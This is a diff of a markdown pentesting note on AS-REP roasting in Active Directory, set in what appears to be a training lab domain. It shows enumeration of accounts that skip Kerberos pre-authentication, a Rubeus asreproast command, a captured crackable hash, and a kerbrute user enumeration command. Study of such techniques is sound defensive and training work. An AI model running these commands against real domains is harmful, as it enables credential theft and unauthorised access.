@@ -1,5 +1,12 @@
+# ASREP Roasting
+
+## Overview
 
 Obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled. Since it is encrypted with the users password it can be cracked offline
+
+## Requirements
+
+- [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) 
 
 #### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
 
@@ -12,7 +19,7 @@ samaccountname     : mmorgan
 userprincipalname  : mmorgan@inlanefreight.local
 useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
 ```
-#### Using [Rubeus](../../../tools/Rubeus.md)
+#### Using [rubeus](rubeus.md)
 ```powershell-session
 Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 ```
@@ -43,9 +50,9 @@ Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
      $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A946485451AAE98BB93DFF8E3E64F3AA5614160F21A029C2B9437CB16E5E9DA4A2870FEC0596B09BADA989D1F8057262EA40840E8D0F20313B4E9A40FA5E4F987FF404313227A7BFFAE748E07201369D48ABB4727DFE1A9F09D50D7EE3AA5C13E4433E0F9217533EE0E74B02EB8907E13A208340728F794ED5103CB3E5C7915BF2F449AFDA41988FF48A356BF2BE680A25931A8746A99AD3E757BFE097B852F72CEAE1B74720C011CFF7EC94CBB6456982F14DA17213B3B27DFA1AD4C7B5C7120DB0D70763549E5144F1F5EE2AC71DDFC4DCA9D25D39737DC83B6BC60E0A0054FC0FD2B2B48B25C6CA
 ```
 
-[[../../../tools/Kerbrute]] from linux with a username list
+[Kerbrute](../../../tools/kerbrute) from linux with a username list
 
-```powershell-session
+```powershell
 kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ```
 
